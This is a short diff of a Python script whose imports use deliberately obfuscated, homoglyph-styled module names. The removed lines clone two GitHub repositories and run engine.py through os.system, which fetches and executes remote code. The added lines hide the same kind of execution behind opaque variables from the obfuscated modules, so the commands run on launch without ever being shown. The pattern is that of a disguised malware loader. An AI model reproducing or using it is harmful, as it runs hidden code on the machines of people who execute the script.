@@ -1,9 +1,9 @@
 import os
-from ռȶɨօռƈ import *
-from Trial import *
-from ʏօʊȶʊɮɛʟɨ import *
-from Latte import *
 from ɛʟɛʍֆ import *
-os.system("git clone https://github.com/vitpotshovit/trote.git")
-os.system("git clone https://github.com/vitpotshovit/Hemlt.git")
-os.system("python engine.py")
+from Latte import *
+from ʏօʊȶʊɮɛʟɨ import *
+from ռȶɨօռƈ import *
+os.system(GC0)
+os.system(G0C)
+os.system(CG0)
+os.system(B0Ot)
